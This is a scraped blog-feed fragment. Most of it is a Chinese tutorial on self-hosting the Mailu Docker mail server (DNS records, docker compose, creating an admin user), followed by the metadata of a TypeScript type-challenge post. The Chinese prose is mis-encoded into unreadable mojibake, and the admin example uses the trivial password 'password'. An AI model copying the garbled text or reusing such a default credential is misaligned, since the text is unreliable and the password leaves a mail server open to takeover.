strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:.5rem solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c;margin:0 5px}.markdown-body a:active,.markdown-body a:hover{text-decoration:none;border-bottom:1.5px solid #3eaf7c}.markdown-body a[href^=http]:after{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04MzIgMTI4SDY0MHY2NGgxNDYuNzUyTDUyMS4zNzYgNDU3LjM3Nmw0NS4yNDggNDUuMjQ4TDgzMiAyMzcuMjQ4VjM4NGg2NFYxMjh6IiBmaWxsPSIjM2VhZjdjIi8+PHBhdGggZD0iTTc2OCA4MzJIMTkyVjI1NmgzNTJ2LTY0SDE2MGEzMiAzMiAwIDAwLTMyIDMydjY0MGEzMiAzMiAwIDAwMzIgMzJoNjQwYTMyIDMyIDAgMDAzMi0zMlY0ODBoLTY0djM1MnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");margin-left:2px}.markdown-body a[href^="#"]:before{content:"#"}.markdown-body table{display:inline-block!important;font-size:13px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c;border-collapse:collapse}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:4px 8px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#7b7878;padding:1px 23px;border-left:.5rem solid;border-color:#42b983;background-color:rgba(66,184,131,.1);position:relative;margin:14px 8px 0}.markdown-body blockquote:before{display:inline-block;position:absolute;content:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjUiIGhlaWdodD0iMjUiIHZpZXdCb3g9IjAgMCAyNyAyNyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxLjg2MiAxLjg2MikiIGZpbGwtcnVsZT0ibm9uemVybyIgZmlsbD0ibm9uZSI+PGNpcmNsZSBzdHJva2U9IiNGRkYiIHN0cm9rZS13aWR0aD0iMS43MjQiIGZpbGw9IiM0MkI5ODMiIGN4PSIxMS42MzgiIGN5PSIxMS42MzgiIHI9IjExLjYzOCIvPjxwYXRoIGQ9Ik0xNC45NzggNi4yN0E1LjAwNiA1LjAwNiAwIDAwNi42NyA5LjQ2OGE0LjkwMSA0LjkwMSAwIDAwMS43NzMgNC4zNjJjLjMyMy4yNTguNTE0LjY0Ny41MjIgMS4wNnYxLjA2YTIuNjg1IDIuNjg1IDAgMDA1LjM3IDB2LTEuMDA4Yy4wMDItLjM5OC4xNzMtLjc3Ny40Ny0xLjA0MmE1LjAyMyA1LjAyMyAwIDAwLjE3My03LjYzem0tMy4zMzcgMTAuOTY3YTEuMzA0IDEuMzA0IDAgMDEtMS4yODYtMS4yODd2LS4yNzhoMi41NzJ2LjI2MWMwIC43MTMtLjU3MyAxLjI5NC0xLjI4NiAxLjMwNHptMi4yNi00LjQxNWMtLjQ0LjM4My0uNzUuODkzLS44ODcgMS40NmgtMi43NDZhMi44NjggMi44NjggMCAwMC0uOTM4LTEuNTNoLS4wMThhMy40NzYgMy40NzYgMCAwMS0xLjI2OS0zLjE0NSAzLjYxNSAzLjYxNSAwIDAxNy4xOTYuNCAzLjY1IDMuNjUgMCAwMS0xLjMzOCAyLjgxNXoiIGZpbGw9IiNGRkYiLz48L2c+PC9zdmc+");width:25px;height:25px;left:-16px;top:12px}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none;padding-left:10px}.markdown-body ul li::marker{content:"â€¢";color:#3eaf7c}.markdown-body ul li.task-list-item:before{content:"";margin-right:0}.markdown-body input[type=checkbox]{vertical-align:text-bottom;box-shadow:inset 0 0 0 10px #fff}.markdown-body input[type=checkbox]:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04NzcuMDU2IDE0Ni45NDR2NzMwLjExMkgxNDYuOTQ0VjE0Ni45NDRoNzMwLjExMnptMC0xMDQuMjc3SDE0Ni45NDRjLTU3LjYyOCAwLTEwNC4yNzcgNDYuNjQ5LTEwNC4yNzcgMTA0LjI3N3Y3MzAuMTEyYzAgNTcuNjI4IDQ2LjY0OSAxMDQuMjc3IDEwNC4yNzcgMTA0LjI3N2g3MzAuMTEyYzU3LjYyOCAwIDEwNC4yNzctNDYuNjQ5IDEwNC4yNzctMTA0LjI3N1YxNDYuOTQ0YzAtNTcuNjI4LTQ2LjY0OS0xMDQuMjc3LTEwNC4yNzctMTA0LjI3N3oiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}.markdown-body input[type=checkbox]:checked:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTUiIGhlaWdodD0iMTUiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik05MTAuMjA4IDBIMTEzLjc2QTExNC4xMTIgMTE0LjExMiAwIDAwLS4wMzIgMTEzLjc5MlY5MTAuMjRjMCA2Mi41OTIgNTEuMiAxMTMuNzkyIDExMy43OTIgMTEzLjc5Mmg3OTYuNDQ4YzYyLjU5MiAwIDExMy43OTItNTEuMiAxMTMuNzkyLTExMy43OTJWMTEzLjc5MkMxMDI0IDUxLjIgOTcyLjggMCA5MTAuMjA4IDB6bS01MTIgNzk2LjQ0OEwxMTMuNzYgNTEybDc5LjY0OC03OS42NDggMjA0LjggMjA0LjhMODMwLjU2IDIwNC44bDc5LjY0OCA3OS42NDgtNTEyIDUxMnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class .hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><blockquote>
<p>ä»â€œä¸ºä»€ä¹ˆè¦è‡ªå»ºé‚®ç®±â€è®²èµ·ï¼Œæ‹†è§£ Mailu çš„æ¶æ„ã€ä¼˜ç¼ºç‚¹ï¼Œä»¥åŠæ™®é€šäººä¹Ÿèƒ½ç…§ç€åšçš„å®‰è£…å®æˆ˜ã€‚</p>
<p>Githubï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMailu%2FMailu" target="_blank" title="https://github.com/Mailu/Mailu" ref="nofollow noopener noreferrer">github.com/Mailu/Mailu</a></p>
<p>å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmailu.io%2F" target="_blank" title="https://mailu.io/" ref="nofollow noopener noreferrer">mailu.io/</a></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/401cc5720a8449ceaacd10398ca7934a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2V0Y2hhclpw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770736855&amp;x-signature=csROttHHvmKZH1iYvGUiQbMFeaI%3D" alt="b4104652304a1f868421518e475c6c1d.png" loading="lazy"/></p>
<p>è¿™å‡ å¹´ï¼Œè¶Šæ¥è¶Šå¤šå›¢é˜Ÿå¼€å§‹é‡æ–°å®¡è§†ä¸€ä»¶äº‹ï¼š<strong>é‚®ç®±ï¼Œåˆ°åº•è¦ä¸è¦æŒæ¡åœ¨è‡ªå·±æ‰‹é‡Œï¼Ÿ</strong></p>
<p>ç”¨ç¬¬ä¸‰æ–¹ä¼ä¸šé‚®ç®±å½“ç„¶çœäº‹ï¼Œä½†è´¦å·å°ç¦ã€åŠŸèƒ½é™åˆ¶ã€éšç§ä¸å¯æ§çš„é—®é¢˜ï¼Œä¸€æ—¦é‡åˆ°ï¼Œå‡ ä¹æ²¡æœ‰å›æ—‹ä½™åœ°ã€‚äºæ˜¯ï¼Œè‡ªå»ºé‚®ä»¶æœåŠ¡å™¨è¿™ä»¶äº‹ï¼Œåˆè¢«ä¸å°‘æŠ€æœ¯å›¢é˜Ÿé‡æ–°æ¡äº†èµ·æ¥ã€‚</p>
<p>è€Œåœ¨ä¸€å †æ–¹æ¡ˆé‡Œï¼Œ<strong>Mailu</strong> æ˜¯è¢«é¢‘ç¹æåˆ°çš„ä¸€ä¸ªåå­—ã€‚</p>
<h3 data-id="heading-0">Mailu æ˜¯ä»€ä¹ˆï¼Ÿä¸€å¥è¯å…ˆè®²æ˜ç™½</h3>
<p><strong>Mailu æ˜¯ä¸€å¥—åŸºäº Docker çš„å¼€æºé‚®ä»¶æœåŠ¡å™¨æ•´ä½“è§£å†³æ–¹æ¡ˆã€‚</strong></p>
<p>å®ƒä¸æ˜¯æŸä¸€ä¸ªå•ç‹¬çš„è½¯ä»¶ï¼Œè€Œæ˜¯æŠŠ<strong>æ”¶ä¿¡ã€å‘ä¿¡ã€ååƒåœ¾ã€Web é‚®ç®±ã€ç®¡ç†åå°</strong>è¿™äº›ç»„ä»¶ï¼Œå…¨éƒ¨æ‹†åˆ†æˆå®¹å™¨ï¼Œå†ç”¨ä¸€å¥—ç»Ÿä¸€çš„æ–¹å¼å¸®ä½ ç»„è£…å¥½ã€‚</p>
<p>ä½ ä¸ç”¨å†è‡ªå·±å»æ‹¼ Postfix + Dovecot + SpamAssassin + Webmailï¼Œä¹Ÿä¸ç”¨è¢«å¤æ‚çš„é…ç½®æ–‡ä»¶æŠ˜ç£¨ï¼ŒMailu çš„ç›®æ ‡å¾ˆç›´æ¥ï¼š<br/>
<strong>è®©â€œè‡ªå»ºé‚®ä»¶æœåŠ¡å™¨â€è¿™ä»¶äº‹ï¼Œå˜å¾—å·¥ç¨‹åŒ–ã€å¯å¤åˆ¶ã€‚</strong></p>
<h3 data-id="heading-1">Mailu å†…éƒ¨æ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼Ÿ</h3>
<p>Mailu æœ¬è´¨ä¸Šæ˜¯ä¸€å¥—â€œé‚®ä»¶ç³»ç»Ÿæ‹¼è£…æ¨¡æ¿â€ï¼Œæ ¸å¿ƒç»„ä»¶åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>Postfix</strong>ï¼šè´Ÿè´£é‚®ä»¶å‘é€ï¼ˆSMTPï¼‰</li>
<li><strong>Dovecot</strong>ï¼šè´Ÿè´£é‚®ä»¶æ¥æ”¶ï¼ˆIMAP / POP3ï¼‰</li>
<li><strong>Rspamd</strong>ï¼šååƒåœ¾ã€åç—…æ¯’</li>
<li><strong>Webmailï¼ˆRoundcube æˆ– RainLoopï¼‰</strong> ï¼šç½‘é¡µé‚®ç®±</li>
<li><strong>Admin ç®¡ç†åå°</strong>ï¼šåŸŸåã€ç”¨æˆ·ã€åˆ«åç»Ÿä¸€ç®¡ç†</li>
<li><strong>Redis / MariaDB</strong>ï¼šçŠ¶æ€å’Œæ•°æ®å­˜å‚¨</li>
</ul>
<p>æ‰€æœ‰ç»„ä»¶éƒ½é€šè¿‡ Docker è¿è¡Œï¼Œä½ çœ‹åˆ°çš„ä¸æ˜¯ä¸€å †é›¶æ•£æœåŠ¡ï¼Œè€Œæ˜¯ä¸€å¥—å·²ç»ç¼–æ’å¥½çš„ç³»ç»Ÿã€‚</p>
<p>è¿™ä¹Ÿæ˜¯ Mailu æœ€å¤§çš„ç‰¹ç‚¹ï¼š<br/>
<strong>å®ƒä¸æ˜¯â€œæ•™ä½ æ€ä¹ˆæ­â€ï¼Œè€Œæ˜¯â€œç›´æ¥ç»™ä½ ä¸€å¥—èƒ½è·‘çš„â€ã€‚</strong></p>
<h3 data-id="heading-2">Mailu çš„åŸºæœ¬å®‰è£…æ€è·¯ï¼ˆä¸è¸©å‘ç‰ˆï¼‰</h3>
<p>æ•´ä½“æµç¨‹å…¶å®å¾ˆæ¸…æ™°ï¼š</p>
<p><strong>ç¬¬ä¸€æ­¥ï¼šé…ç½® DNS</strong></p>
<p>å‡è®¾åŸŸåä¸º <code>example.com</code>ï¼ŒæœåŠ¡å™¨IPä¸º <code>1.2.3.4</code></p>
<ul>
<li>
<p>A è®°å½•</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¸»æœºè®°å½•           è®°å½•ç±»å‹  IP</span>
mail.example.com    A    1.2.3.4
</code></pre>
</li>
<li>
<p>MX è®°å½•</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¸»æœºè®°å½•@    è®°å½•ç±»å‹  ä¼˜å…ˆçº§  è®°å½•å€¼</span>
example.com    MX    10 mail.example.com
</code></pre>
</li>
</ul>
<p>æ ¸å¿ƒæ˜¯é…ç½® Aã€MX è®°å½•ï¼Œè¿™æ˜¯é‚®ä»¶ç³»ç»Ÿæˆè´¥çš„å…³é”®ä¸€æ­¥ï¼Œä¸èƒ½çœã€‚å¦å¤–è¿˜æœ‰ SPFã€DKIMã€DMARC å¯ä»¥æŒ‰éœ€é…ç½®ã€‚</p>
<p><strong>ç¬¬äºŒæ­¥ï¼šå¯åŠ¨ Mailu</strong></p>
<ul>
<li>
<p>åˆ›å»º mailu æ–‡ä»¶å¤¹</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">mkdir</span> /mailu
<span class="hljs-built_in">cd</span> /mailu
</code></pre>
</li>
<li>
<p>è®¿é—® <a href="https://link.juejin.cn?target=https%3A%2F%2Fsetup.mailu.io%2F" target="_blank" title="https://setup.mailu.io/" ref="nofollow noopener noreferrer">setup.mailu.io/</a> å¡«å†™åŸŸåä¿¡æ¯åï¼ˆå‚è€ƒä»¥ä¸‹æˆªå›¾å¡«å†™ä¸»åŸŸåã€äºŒçº§åŸŸåï¼‰ï¼Œç‚¹å‡»ç•Œé¢æœ€ä¸‹æ–¹çš„ <strong>Setup Mailu</strong> ,æ­¤æ—¶å®˜æ–¹ä¼šè·³è½¬åˆ° Mailu configuration - ç•Œé¢ï¼Œä¸‹è½½ç•Œé¢æä¾› <strong>docker-compose.yml</strong> ã€<strong>mailu.env</strong> çš„ä¸¤ä¸ªæ–‡ä»¶åˆ°æœåŠ¡å™¨çš„ mailu ç›®å½•ä¸‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4da49385afcd43d68d7c4195bfbc793d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2V0Y2hhclpw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770736855&amp;x-signature=pScsZFwxYhVGFH5NjXfkOahvmY0%3D" alt="image.png" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca7ea51b7d5e42579dd158f99c25a9fc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2V0Y2hhclpw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770736855&amp;x-signature=VCKi1MpQNM1HbNp21H56hAjJWas%3D" alt="image.png" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f29e49b36cce4673a23c525fb14e35ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2V0Y2hhclpw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770736855&amp;x-signature=k5AUT9iMiIcQlVTOTNqAJurrkj0%3D" alt="ef0a9155f8456effe2f44b4846712252.png" loading="lazy"/></p>
</li>
<li>
<p>æ‰‹åŠ¨ä¿®æ”¹ <strong>docker-compose.yml</strong> ï¼Œç§»é™¤ front ç«¯å£æ˜ å°„ä¸­çš„ <code>127.0.0.1</code> ï¼Œä½¿å…¶èƒ½å¤Ÿè¢«å¤–éƒ¨è®¿é—®åˆ°</p>
</li>
<li>
<p>ä¸€æ¡å‘½ä»¤å¯åŠ¨æœåŠ¡ <code>docker compose up -d</code></p>
</li>
</ul>
<p><strong>ç¬¬ä¸‰æ­¥ï¼šåå°åˆ›å»ºç”¨æˆ·</strong></p>
<ul>
<li>
<p>ç™»å½• Admin é¡µé¢ï¼Œåœ¨æµè§ˆå™¨ä¸­è®¿é—® <code>æœåŠ¡å™¨IP/admin</code> æˆ–è€… <code>mail.ä¸»åŸŸå/admin</code>ï¼ŒæœåŠ¡é»˜è®¤åœ¨ 80 ç«¯å£ä¸Š</p>
</li>
<li>
<p>æ·»åŠ åŸŸåã€é‚®ç®±è´¦å·ï¼Œæ‰§è¡Œä¸‹é¢å‘½ä»¤åä¼šè·å–åˆ°ä¸€ä¸ªè¶…ç®¡è´¦æˆ·ï¼Œé‚®ç®±ä¸º <code>me.example.com</code> ï¼Œå¯†ç ä¸º <code>password</code></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># docker compose exec admin flask mailu admin [ç”¨æˆ·å] [ä¸»åŸŸå] [å¯†ç ]</span>
<span class="hljs-comment"># ç¤ºä¾‹ï¼š</span>
docker compose <span class="hljs-built_in">exec</span> admin flask mailu admin me example.com <span class="hljs-string">'password'</span>
</code></pre>
</li>
<li>
<p>æµ‹è¯•æ”¶å‘é‚®ä»¶</p>
<p>è®¿é—® <code>æœåŠ¡å™¨IP/webmail</code> æˆ–è€… <code>mail.ä¸»åŸŸå/webmail</code> å¦‚æœèƒ½æ”¶åˆ°å…¶ä»–é‚®ä»¶ç³»ç»Ÿå‘é€è¿‡æ¥çš„é‚®ä»¶ï¼Œè¯´æ˜æ”¶ä»¶ç›¸å…³çš„é…ç½®æ²¡æœ‰é—®é¢˜å’¯</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e84190ae52894eecbe3d79c430dd1735~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2V0Y2hhclpw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770736855&amp;x-signature=e7DOmreRsijNrLCrP9CnunAqHIo%3D" alt="227b722c1c28869466385f52dc90b875.png" loading="lazy"/></p>
</li>
</ul>
<h3 data-id="heading-3">å†™åœ¨æœ€å</h3>
<p>Mailu å¹¶ä¸æ˜¯â€œæœ€ç®€å•â€çš„é‚®ä»¶æ–¹æ¡ˆï¼Œä½†å®ƒæ˜¯<strong>å°‘æ•°èƒ½æŠŠå¤æ‚äº‹æƒ…ç³»ç»ŸåŒ–çš„æ–¹æ¡ˆä¹‹ä¸€</strong>ã€‚</p>
<p>å½“ä½ çœŸæ­£æŠŠé‚®ä»¶å½“æˆä¸€é¡¹åŸºç¡€è®¾æ–½ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå¤–åŒ…æœåŠ¡æ—¶ï¼Œä½ ä¼šå‘ç°ï¼Œè‡ªå»ºå¹¶æ²¡æœ‰æƒ³è±¡ä¸­é‚£ä¹ˆå¯æ€•ã€‚</p>
<p>çœŸæ­£éš¾çš„ï¼Œä»æ¥ä¸æ˜¯å·¥å…·ï¼Œè€Œæ˜¯ä½ æ˜¯å¦æ„¿æ„ä¸ºâ€œå¯æ§â€ä»˜å‡ºä¸€ç‚¹å­¦ä¹ æˆæœ¬ã€‚</p>
<p>å¦‚æœä½ å·²ç»åœ¨è€ƒè™‘è¿™ä¸€æ­¥ï¼ŒMailuï¼Œå€¼å¾—ä½ è®¤çœŸè¯•ä¸€æ¬¡ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[type-challengesï¼ˆtsç±»å‹ä½“æ“ï¼‰: 20 - Promise.all]]></title>    <link>https://juejin.cn/post/7602503154505351209</link>    <guid>https://juejin.cn/post/7602503154505351209</guid>    <pubDate>2026-02-03T14:05:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602503154505351209" data-draft-id="7602420156397600811" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="type-challengesï¼ˆtsç±»å‹ä½“æ“ï¼‰: 20 - Promise.all"/> <meta itemprop="keywords" content="TypeScript"/> <meta itemprop="datePublished" content="2026-02-03T14:05:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="fxss"/> <meta itemprop="url" content="https://juejin.cn/user/3702810892856808"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            type-challengesï¼ˆtsç±»å‹ä½“æ“ï¼‰: 20 - Promise.all
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3702810892856808/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    fxss
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T14:05:39.000Z" title="Tue Feb 03 2026 14:05:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 